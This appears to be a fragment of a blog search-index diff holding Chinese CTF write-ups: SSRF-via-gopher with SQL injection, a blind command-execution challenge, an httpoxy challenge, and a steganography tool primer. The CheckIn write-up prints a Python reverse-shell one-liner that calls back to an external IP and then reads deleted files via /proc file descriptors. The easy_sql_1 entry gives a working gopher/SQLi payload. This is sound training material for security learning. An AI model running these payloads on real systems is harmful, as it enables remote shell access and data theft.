<span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个用%0a或者%0d绕过，一开始我用%0a可以，后来用%0d才可以，都放在utils.php的后面<br>然后第二个使用url的一个检测机制绕过<br>访问这个是学长的截图了，放在这里记录一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008215235.png" alt="img" style="zoom:50%;"></p>
+<h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><p>这题也是学长做的，不过说是原题</p>
+<p>Spring Web Flow框架远程代码执行(CVE-2017-4971)</p>
+<p><a href="https://juejin.cn/post/7006672559714336805">https://juejin.cn/post/7006672559714336805</a></p>
+<h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>唯一没做出来的一题<br>一开始以为是ssrf打mysql，后来发现怎么打都不行，然后赛后问其他师傅，说是要打index.php那个页面，贴一下flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; &quot;admin&#39;)and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;</span><br><span class="line">a &#x3D; quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))</span><br><span class="line">payload &#x3D; f&#39;&#39;&#39;gopher%3a%2f%2f127.0.0.1%3a80%2f_post%20%2findex.php%20http%2f1.1%250d%250ahost%3a%20localhost%3a80%250d%250acookie%3a%20phpsessid%3d25c1mm4b3ppn9ohr2gve7d4tg4%3bthis_is_your_cookie%3d&#123;a&#125;%250d%250aconnection%3a%20close%250d%250acontent-type%3a%20application%2fx-www-form-urlencoded%250d%250acontent-length%3a%2021%250d%250a%250d%250auname%3dadmin%26passwd%3dadmin&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>解码以后是就是使用gopher发送post请求到本地的index.php页面，然后使用admin/admin进行登录，并且注入点是在cookie的位置的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; &quot;admin&#39;)and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;</span><br><span class="line">a &#x3D; quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))</span><br><span class="line">payload &#x3D; f&#39;&#39;&#39;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_post &#x2F;index.php http&#x2F;1.1</span><br><span class="line">host: localhost:80</span><br><span class="line">cookie: phpsessid&#x3D;25c1mm4b3ppn9ohr2gve7d4tg4;this_is_your_cookie&#x3D;&#123;a&#125;</span><br><span class="line">connection: close</span><br><span class="line">content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">content-length: 21</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>V&amp;N2020</title>
+    <url>/2021/10/09/V-N2020/</url>
+    <content><![CDATA[<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>ctfd漏洞 cve-2020-7245</p>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p><strong><code>考点： 1.无回显rce 2.文件描述符</code></strong><br>分析源码:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们先分析下几个路由，很明显，我们可以在shell这个路由执行命令，但是他是无回显的，然后接下来我们可以看到，flag.txt这个文件，会先被打开，然后再执行删除命令，所以要如何读到这个flag呢？<br><strong>文件描述符</strong><br>什么是文件描述符：内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>
+<p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p>
+<p><strong>文件描述符储存在什么地方：</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p>
+<p>也就是说，我们可以通过cat进程中的fd来获取到文件描述符。而文件描述符中就存储着该文件的内容</p>
+<p>无回显命令执行，一般都是考虑反弹shell操作，但是这里curl等一些常见命令都执行不了，这有这个可以</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c </span><br><span class="line">&#39;</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;110.42.133.120&quot;,9999));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1); </span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就使用以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;proc</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;proc&#x2F;[pid]#进程数字</span><br><span class="line">cd &#x2F;porc&#x2F;[pid]&#x2F;fd</span><br><span class="line">cat [文件描述符数字]</span><br></pre></td></tr></table></figure>
+
+<p>进行flag的查找即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009135313.png" alt="img" style="zoom:67%;"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这题的考点让我没想到的是，原来文件描述符里面可以存储文件的信息，只要你有对他进行操作既有，以前都是光用，没想到这个~，现在就明了了</p>
+<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag的条件是data[success]的条件为true，这里有个漏洞就是这题的考点<br><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a><br>大致就是，如果定义了环境变量http_proxy，php内的http-api就会走这个代理。在这个phpinfo中就开启了cgi模式了，然后可以在服务器写入需要传入的一个true的内容，并在题目那边配置这个地址即可收到我们传入的content</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Fri, 06 Mar 2020 18:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009144906.png" alt="img" style="zoom:67%;">
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009144929.png" alt="img" style="zoom:67%;">
+
+]]></content>
+  </entry>
+  <entry>
+    <title>misc入门</title>
+    <url>/2021/10/09/misc%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="文件头修复"><a href="#文件头修复" class="headerlink" title="文件头修复"></a>文件头修复</h3><p>常见的图片格式文件头如下：</p>
+<table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG(jpg)</td>
+<td>FFD8FF</td>
+</tr>
+<tr>
+<td>PNG(png)</td>
+<td>89504E47</td>
+</tr>
+<tr>
+<td>GIF(gif)</td>
+<td>47494638</td>
+</tr>
+<tr>
+<td>BMP</td>
+<td>424DC001</td>
+</tr>
+</tbody></table>
+<p>其他更多类型的文件头请看<a href="https://blog.csdn.net/qq_23100787/article/details/79040925">https://blog.csdn.net/qq_23100787/article/details/79040925</a></p>
+<p>方法：以16进制的方式打开文件，在文件最开始添加相应的文件头</p>
+<h4 id="CRC校验修复"><a href="#CRC校验修复" class="headerlink" title="CRC校验修复"></a>CRC校验修复</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009105034.jpeg" alt="img" style="zoom:67%;">
+
+<h4 id="3-宽高修复"><a href="#3-宽高修复" class="headerlink" title="3.宽高修复"></a><strong>3.宽高修复</strong></h4><p>对于png格式的图片，宽高的数据位置如图片所展示的那样</p>
+<p><img src="https://image.3001.net/images/20210320/1616208064_605560c025598e02e7b91.jpg!small" alt="img"></p>
+<p>如果遇到简单一点的题目，可以直接尝试修改宽高，这里建议一般选择修改<strong>高度</strong>，一点点的改动即可。如果随意修改宽度一般都是会造成图像错误的。</p>
+<blockquote>
+<p>一个简单的检测宽高是否有误的方法：在Windows下能打开的图片在linux下不能打开，就说明可能是宽高存在问题</p>
+</blockquote>
+<p>最正确的方法则是通过crc值爆破宽高，给出大佬的脚本（记不得是哪里找到的了）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#-*- coding:UTF-8 -*-</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line">crcbp &#x3D; open(&quot;flag.png&quot;,&quot;rb&quot;).read()#填文件名</span><br><span class="line">for i in range(1024):</span><br><span class="line">    for j in range(1024):</span><br><span class="line">        data &#x3D; crcbp[12:16] + struct.pack(&#39;&gt;i&#39;,i) + struct.pack(&#39;&gt;i&#39;,j) + crcbp[24:29]</span><br><span class="line">        crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">        if crc32 &#x3D;&#x3D; 0x4d614986 :#此处填CRC值</span><br><span class="line">            print (i);</span><br><span class="line">            print (j);</span><br><span class="line">            print (hex(i),hex(j))</span><br></pre></td></tr></table></figure>
+
+<p>爆破出来后修改即可。</p>
+<p>对于<strong>jpg</strong>格式的图片也存在宽高隐写，有师傅写的很详细了，此处不再赘述。有需要的朋友请移步：<a href="https://blog.csdn.net/u010391191/article/details/80811813">https://blog.csdn.net/u010391191/article/details/80811813</a></p>
+<h3 id="4-LSB隐写"><a href="#4-LSB隐写" class="headerlink" title="4.LSB隐写"></a>4.LSB隐写</h3><p>有关该隐写方式的原理网上已经有很多文章写过了，此处简单说一下做题方法。</p>
+<p>工具：stegsolve（需要java环境）</p>
+<p>用该工具打开图片后，点击<img src="https://image.3001.net/images/20210320/1616209932_6055680c923adb2cadca5.png!small?1616209932678" alt="1616209932_6055680c923adb2cadca5.png!small?1616209932678">然后按照如下图片点击<img src="https://image.3001.net/images/20210320/1616210229_6055693533f311bdd67e9.png!small?1616210229611" alt="1616210229_6055693533f311bdd67e9.png!small?1616210229611">最后点击preview。有时候点preview没用，需要点击最下面的save text或者save bin才能得出结果。这张图只是给出了示例，具体做题的时候可以多试一下和其他按键的组合。</p>
+<p>还有一个比较简单的方法，用<strong>zsteg</strong>工具，需要kali里面在线安装：gem install zsteg</p>
+<p>使用命令格式：zsteg filename</p>
+<h3 id="5-对于两张相同图片的隐写"><a href="#5-对于两张相同图片的隐写" class="headerlink" title="5.对于两张相同图片的隐写"></a>5.对于两张相同图片的隐写</h3><p><strong>1.盲水印</strong></p>
+<p>两张相同的图片首先考虑盲水印。使用方法及脚本移步<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
+<p><strong>2.组合进行不同运算（and、or、xor等）</strong></p>
+<p>还是用stegsolve，点击<img src="https://image.3001.net/images/20210320/1616210657_60556ae10459af20228c1.png!small?1616210657114" alt="1616210657_60556ae10459af20228c1.png!small?1616210657114">之后会再让你打开一张图片，此时需要注意两张图片的打开<strong>顺序</strong>不同，运算的结果也不同，实际操作中就需要各位来回试一下了</p>
+<h3 id="6-文件分离"><a href="#6-文件分离" class="headerlink" title="6.文件分离"></a>6.文件分离</h3><p>常用工具：binwalk、formost、dd</p>
+<p><strong>binwalk</strong>：可快速分辨文件是否由多个文件合并而成，并将文件进行分离。如果分离成功会在目标文件的目录。</p>
+<p>分析文件：binwalk filename</p>
+<p>分离文件：binwalk -e filename</p>
+<p><strong>formost</strong>命令：formost filename -o 输出的目录名</p>
+<p>因本人较懒，所以用了一个师傅说的方法，在用formost分离文件时很方便（不用敲命令）。参考链接：<a href="https://blog.csdn.net/qq_39368007/article/details/91129628">https://blog.csdn.net/qq_39368007/article/details/91129628</a></p>
+<p><strong>dd</strong>：当文件自动分离出错或者因为其他原因无法自动分离时使用</p>
+<p><img src="https://image.3001.net/images/20210320/1616211319_60556d771acf19840fa03.jpg!small" alt="img">ps：如果一个工具分离不出来一定要多试几种，因为每种工具分离方法都有所差别，难免会出现分离不出来的情况。</p>
+<h3 id="7-二维码"><a href="#7-二维码" class="headerlink" title="7.二维码"></a>7.二维码</h3><p><strong>取反色</strong></p>
+<p>有一道题就是将二维码颜色取反再扫描得出结果，记不得是哪里的了。具体操作可以用windows自带的画图工具，打开图片然后点击主页的选择<img src="https://image.3001.net/images/20210320/1616227603_6055ad138ab71dcb1211d.png!small?1616227603841" alt="1616227603_6055ad138ab71dcb1211d.png!small?1616227603841">选中图片后右键选择反色<img src="https://image.3001.net/images/20210320/1616227637_6055ad354400e7dcbc8d7.png!small?1616227637530" alt="1616227637_6055ad354400e7dcbc8d7.png!small?1616227637530">当你发现二维码的三个定位点是白色的时候，就说明需要进行反色操作了</p>
+<h3 id="8-一些其他常用工具介绍"><a href="#8-一些其他常用工具介绍" class="headerlink" title="8.一些其他常用工具介绍"></a>8.一些其他常用工具介绍</h3><p>针对jpg格式图片的隐写：</p>
+<p><a href="http://steghide.sourceforge.net/download.php"><strong>steghide</strong></a></p>
+<p><strong>用法</strong>：</p>
+<p>隐藏文件<br>steghide embed -cf [图片或wav文件载体] -ef [待隐藏文件]<br>steghide embed -cf 1.jpg -ef 1.txt</p>
+<p>查看图片中嵌入的文件信息<br>steghide info 1.jpg</p>
+<p>提取图片中隐藏的文件<br>steghide extract -sf 1.jpg</p>
+<blockquote>
+<p>stegdetect（可检测通过JSteg,JPHide,OutGuess,Invisible,F5,oppendX,Camouflage等隐写工具隐藏的信息）</p>
+</blockquote>
+<p><strong>用法</strong>：</p>
+<blockquote>
+<p>stegdetect xxx.jpg</p>
+<p>stegdetect -s 敏感度 xxx.jpgexi</p>
+<p>stegbreak（爆破密码）<br>stegbreak.exe -r rules.ini -f password.txt p -c hide.jpg</p>
+</blockquote>
+<p><strong>jphide</strong></p>
+<ul>
+<li><img src="https://image.3001.net/images/20210320/1616211928_60556fd847b8890e476d8.png!small" alt="img">silenteye（下面会有一定的介绍，用法基本一致）</li>
+</ul>
+<h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="1-针对mp3文件的隐写"><a href="#1-针对mp3文件的隐写" class="headerlink" title="1.针对mp3文件的隐写"></a><strong>1.针对mp3文件的隐写</strong></h3><p>将分别介绍以下工具：Audacity、MP3Stego</p>
+<p><a href="https://audacity.en.softonic.com/">Audacity</a></p>
+<p>一般得到题目文件，打开听到有杂音首选用这个工具打开。简单的题目就是在原音频中加入了一段摩斯密码，通过这个工具可以直接看出来</p>
+<p><img src="https://image.3001.net/images/20210320/1616218195_605588537af8362ba567f.png!small" alt="img">然后解密即可。</p>
+<p>难一点的题目则是对音频进行频谱分析，比如这篇文章<a href="https://blog.csdn.net/vhkjhwbs/article/details/103036133%E8%B0%88%E5%88%B0%E7%9A%84lookme%E5%92%8C%E7%94%A8%E7%9C%BC%E7%9D%9B%E5%8E%BB%E5%80%BE%E5%90%AC%E8%BF%99%E4%B8%A4%E9%81%93%E9%A2%98%E3%80%82">https://blog.csdn.net/vhkjhwbs/article/details/103036133谈到的lookme和用眼睛去倾听这两道题。</a></p>
+<p>MP3Stego</p>
+<p>如果mp3 文件听上去没有什么奇怪的地方，那么就试试用这个工具。教程：<a href="https://blog.csdn.net/myloveprogrmming/article/details/52641916">https://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p>
+<p>用这个工具会输入密码，有时候题目没有特别提示就可以试试弱口令，有时候甚至就是题目名字。</p>
+<h3 id="2-针对wav文件的隐写"><a href="#2-针对wav文件的隐写" class="headerlink" title="2.针对wav文件的隐写"></a>2.针对wav文件的隐写</h3><p>工具：silenteye</p>
+<p><img src="https://image.3001.net/images/20210320/1616218647_60558a175fc225d11a3cb.png!small" alt="img"></p>
+<p>将文件拖到里面点击decode</p>
+<p><img src="https://image.3001.net/images/20210320/1616219110_60558be69cb4a29f9b5b0.png!small?1616219110893" alt="1616219110_60558be69cb4a29f9b5b0.png!small?1616219110893">简单的题目此时再点右下角的decode就能出结果，稍微绕点的就还需要<img src="https://image.3001.net/images/20210320/1616218742_60558a76a44a76b41701c.png!small?1616218743088" alt="1616218742_60558a76a44a76b41701c.png!small?1616218743088">勾选这里输入密码，或者选择正确的type，看出题人的心思了~</p>
+<p><img src="https://image.3001.net/images/20210320/1616218784_60558aa0c70f5b6d4606f.png!small?1616218784960" alt="1616218784_60558aa0c70f5b6d4606f.png!small?1616218784960"></p>
+<p>当然，这个工具还能对<strong>bmp、jpg</strong>格式的隐写文件进行解密</p>
+<h2 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h2><h3 id="1-针对mp4文件的隐写"><a href="#1-针对mp4文件的隐写" class="headerlink" title="1.针对mp4文件的隐写"></a>1.针对mp4文件的隐写</h3><p>工具：ffmpeg（一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。）</p>
+<p>详细使用教程介绍：<a href="https://blog.csdn.net/Allyli0022/article/details/78355248">https://blog.csdn.net/Allyli0022/article/details/78355248</a></p>
+<p>一般在题目中会插入一些图片，由于一下就闪过了所以需要用这个工具按帧提取出来，简单的题目往往这样就能做出来了。</p>
+<h2 id="文本隐写"><a href="#文本隐写" class="headerlink" title="文本隐写"></a>文本隐写</h2><h3 id="1-word文档隐写"><a href="#1-word文档隐写" class="headerlink" title="1.word文档隐写"></a>1.word文档隐写</h3><p>白色文字</p>
+<p>由于一般word文档都是白色为底色，所以如果文本字体设置的是白色，就看不出来有东西，这个时候可以试试<strong>ctrl+a</strong>，全选文字</p>
+<p><img src="https://image.3001.net/images/20210320/1616222817_60559a617585519deeeaa.png!small?1616222817668" alt="1616222817_60559a617585519deeeaa.png!small?1616222817668"></p>
+<p>再把颜色改成其他颜色，就能看出来被隐藏的文字了</p>
+<p><strong>隐藏文字选项</strong></p>
+<p>在文本出右键鼠标，字体选项中有一处隐藏文字选项<img src="https://image.3001.net/images/20210320/1616222980_60559b04517f08d9681bd.png!small?1616222980656" alt="1616222980_60559b04517f08d9681bd.png!small?1616222980656">取消勾选后被隐藏的文字就出现了<img src="https://image.3001.net/images/20210320/1616222937_60559ad95afa4b0ecc0f0.png!small?1616222937529" alt="1616222937_60559ad95afa4b0ecc0f0.png!small?1616222937529"></p>
+<h3 id="2-PDF隐写"><a href="#2-PDF隐写" class="headerlink" title="2.PDF隐写"></a>2.PDF隐写</h3><p>wbs43open（可用于PDF、bmp等文件的隐写）</p>
+<p><img src="https://image.3001.net/images/20210320/1616223111_60559b879a5b8bb7bff13.png!small" alt="1616223111_60559b879a5b8bb7bff13.png!small"></p>
+<p>点击continue后会出现encode和decode，解密就选decode，然后第三步就选择文件类型和文件</p>
+<p><img src="https://image.3001.net/images/20210320/1616223176_60559bc85ad7d38896b5a.png!small" alt="1616223176_60559bc85ad7d38896b5a.png!small"></p>
+<p>第四步步设置密码，可以置空</p>
+<p><img src="https://image.3001.net/images/20210320/1616223637_60559d9519ea72fcbf03a.png!small" alt="1616223637_60559d9519ea72fcbf03a.png!small"></p>
+<p>第五步设置解密之后文件的存储路径及文件名</p>
+<p><img src="https://image.3001.net/images/20210320/1616223715_60559de338f52f5b9799b.png!small" alt="1616223715_60559de338f52f5b9799b.png!small"></p>
+<p>接下来第六步完成就行啦</p>
+<p>要出这种类型的隐写题同样用这个工具也行。</p>
+<h3 id="3-html隐写"><a href="#3-html隐写" class="headerlink" title="3.html隐写"></a>3.html隐写</h3><p>即snow隐写，需要告诉key，解密网站<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p>
+<h2 id="其他类型的隐写"><a href="#其他类型的隐写" class="headerlink" title="其他类型的隐写"></a>其他类型的隐写</h2><h3 id="1-base64隐写"><a href="#1-base64隐写" class="headerlink" title="1.base64隐写"></a>1.base64隐写</h3><p>Tr0y师傅的文章讲解的很详细，在这里就不过多介绍了，请移步<a href="https://www.tr0y.wang/2017/06/14/Base64steg/">https://www.tr0y.wang/2017/06/14/Base64steg/</a></p>
+<h3 id="2-零宽度字符隐写"><a href="#2-零宽度字符隐写" class="headerlink" title="2.零宽度字符隐写"></a>2.零宽度字符隐写</h3><p>零宽度字符是一些不可见的，不可打印的字符。本文不做更多介绍，更详细的内容请移步<a href="http://www.ga1axy.top/index.php/archives/20/">http://www.ga1axy.top/index.php/archives/20/</a></p>
+<h3 id="3-ntfs数据流隐写"><a href="#3-ntfs数据流隐写" class="headerlink" title="3.ntfs数据流隐写"></a>3.ntfs数据流隐写</h3><blockquote>
+<p>NTFS（New Technology File System）是Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式，提供长文件名、数据保护和恢复，能通过目录和文件许可实现安全性，并支持跨越分区。 –《百度百科》</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo abcdefg&gt;&gt;123.txt:222.txt</span><br></pre></td></tr></table></figure>
+
+<p>该条命令创建的是单独的NTFS流文件，系统不可见的同时我们无法通过普通方法看到</p>
+<p><img src="https://image.3001.net/images/20210320/1616225534_6055a4feb5b26c242be4a.png!small?1616225534943" alt="1616225534_6055a4feb5b26c242be4a.png!small?1616225534943">此时有两种方法，一种是命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notepad 123.txt:222.txt &#x2F;&#x2F;这个命令只有自己已经知道NTFS流文件名的时候使用，局限性很大，同时失败几率大	</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210320/1616225700_6055a5a42a3daec335e68.png!small?1616225700447" alt="1616225700_6055a5a42a3daec335e68.png!small?1616225700447"></p>
+<p>另一种方法是用工具：NtfsStreamsEditor（右键以管理员身份运行）</p>
+<p><img src="https://image.3001.net/images/20210320/1616225578_6055a52a4b4eeeb8fc64b.png!small?1616225578565" alt="1616225578_6055a52a4b4eeeb8fc64b.png!small?1616225578565"></p>
+<p>点击快速查看</p>
+<p><img src="https://image.3001.net/images/20210320/1616225643_6055a56bf3e0864995ec3.png!small?1616225644260" alt="1616225643_6055a56bf3e0864995ec3.png!small?1616225644260"></p>
 ]]></content>
   </entry>
 </search>
